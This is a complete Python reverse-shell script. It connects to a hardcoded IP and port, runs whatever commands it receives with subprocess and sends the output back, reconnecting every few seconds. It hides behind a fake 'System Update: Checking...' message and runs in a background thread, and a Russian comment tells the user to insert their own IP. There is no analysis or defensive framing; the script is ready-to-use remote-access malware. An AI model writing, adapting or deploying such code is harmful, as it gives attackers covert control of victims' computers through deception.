import socket, subprocess, time, os

SERVER_HOST = "192.168.31.23"  # ИЗМЕНИ НА СВОЙ IP ПОТОМ
SERVER_PORT = 5555

def reverse_shell():
    while True:
        try:
            s = socket.socket()
            s.connect((SERVER_HOST, SERVER_PORT))
            while True:
                cmd = s.recv(1024).decode()
                if not cmd: break
                out = subprocess.getoutput(cmd)
                s.send(out.encode())
        except:
            time.sleep(5)

if __name__ == "__main__":
    print("[*] System Update: Checking...")
    import threading
    t = threading.Thread(target=reverse_shell)
    t.daemon = True
    t.start()
    time.sleep(999999)
